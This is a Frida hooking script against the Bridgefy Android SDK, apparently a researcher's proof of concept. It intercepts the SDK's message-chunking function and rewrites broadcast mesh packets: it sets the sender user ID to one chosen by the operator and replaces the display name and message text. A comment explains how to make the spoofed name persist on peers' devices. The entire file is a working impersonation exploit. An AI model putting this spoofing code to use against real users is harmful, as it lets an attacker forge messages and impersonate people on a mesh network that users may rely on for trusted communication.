const PATH_LIST = 'java.util.List';
const PATH_STRING = 'java.lang.String';
const PATH_HASHMAP = 'java.util.HashMap';

const PATH_BLEENTITY = 'com.bridgefy.sdk.framework.entities.BleEntity';
const PATH_CHUNKUTILS = 'com.bridgefy.sdk.framework.controller.ChunkUtils';
const PATH_FORWARDPACKET = 'com.bridgefy.sdk.framework.entities.ForwardPacket';
const PATH_FORWARDTRANSACTION = 'com.bridgefy.sdk.framework.entities.ForwardTransaction';

let userid;
let username;
let message;

function run() {
	const JChunkUtils = Java.use(PATH_CHUNKUTILS);
	const JForwardTransaction = Java.use(PATH_FORWARDTRANSACTION);
	const JForwardPacket = Java.use(PATH_FORWARDPACKET);
	const JHashMap = Java.use(PATH_HASHMAP)

	const fEncrypt = JChunkUtils.a.overload(PATH_BLEENTITY, 'int', 'boolean', 'boolean', PATH_STRING)
	fEncrypt.implementation = function (bleEntity, chunkSize, alwaysTrue, unused, userId) {
		if (bleEntity.getEt() == 3) {
			const transaction = Java.cast(bleEntity.getCt(), JForwardTransaction);
			const packets = Java.cast(transaction.getMesh(), Java.use(PATH_LIST));

			for (var i = 0; i < packets.size(); i++) {
				const packet = Java.cast(packets.get(i), JForwardPacket);

				if (packet.getReceiver_type() == 1) {
					send('[*] Changing sender of this broadcast message...');

					packet.setSender(userid);

					// Set a new display name. Note that the peer's app will remember the display name forever, and
					// associate it with the userId. If you don't see the display name changing, try setting a different
					// userId above.
					const payload = Java.cast(packet.getPayload(), JHashMap);
					payload.put('nm', username);
					payload.put('ct', message);
				}
			}
		}

		return this.a(bleEntity, chunkSize, alwaysTrue, unused, userId);
	}
};

recv('params', function onMessage(post) {
	userid = post.userid;
	username = post.username;
	message = post.message;

	setImmediate(function () { Java.perform(run) });
});
